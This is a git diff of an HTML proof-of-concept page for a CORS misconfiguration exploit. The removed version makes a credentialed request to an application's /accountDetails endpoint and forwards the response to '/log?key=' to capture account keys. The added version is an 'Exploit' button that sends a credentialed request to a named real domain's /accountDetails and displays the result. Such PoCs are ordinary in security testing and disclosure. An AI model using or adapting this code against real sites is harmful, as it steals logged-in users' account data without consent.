@@ -1,27 +1,22 @@
 <html>
-  <body>
-    <script>
-
-    #Initialize the XMLHttpRequest object, and the application URL vairable 
-        var req = new XMLHttpRequest();
-        var url = ("APPLICATION URL");
-
-    #MLHttpRequest object loads, exectutes reqListener() function
-      req.onload = retrieveKeys;
-
-    #Make GET request to the application accounDetails location
-        req.open('GET', url + "/accountDetails",true);
-    
-    #Allow passing credentials with the requests
-    req.withCredentials = true;
-
-    #Send the request 
-        req.send(null);
-
-    function retrieveKeys() {
-            location='/log?key='+this.responseText;
-        };
-
-  </script>
-  <body>
-</html>
+     <body>
+         <h2>CORS PoC</h2>
+         <div id="demo">
+             <button type="button" onclick="cors()">Exploit</button>
+         </div>
+         <script>
+             function cors() {
+             var xhr = new XMLHttpRequest();
+             xhr.onreadystatechange = function() {
+                 if (this.readyState == 4 && this.status == 200) {
+                 document.getElementById("demo").innerHTML = alert(this.responseText);
+                 }
+             };
+              xhr.open("GET",
+                       "https://fecredit.com.vn/accountDetails", true);
+             xhr.withCredentials = true;
+             xhr.send();
+             }
+         </script>
+     </body>
+ </html>
